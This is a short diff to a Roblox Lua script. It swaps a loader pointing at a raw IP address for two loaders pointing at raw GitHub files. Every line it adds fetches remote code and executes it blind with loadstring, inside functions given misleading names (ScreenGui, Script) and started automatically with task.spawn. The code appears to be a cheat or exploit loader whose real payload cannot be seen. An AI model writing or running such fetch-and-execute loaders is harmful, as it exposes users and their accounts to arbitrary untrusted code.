@@ -1,2 +1,8 @@
-ID="3b202a29-7141-4a95-af0e-bf0e6f97d885";
-loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
+local function ScreenGui()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xeroxson/script/refs/heads/main/script"))()
+end
+local function Script()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xeroxson/-/refs/heads/main/lopuh"))()
+end
+task.spawn(Script)
+task.spawn(ScreenGui)
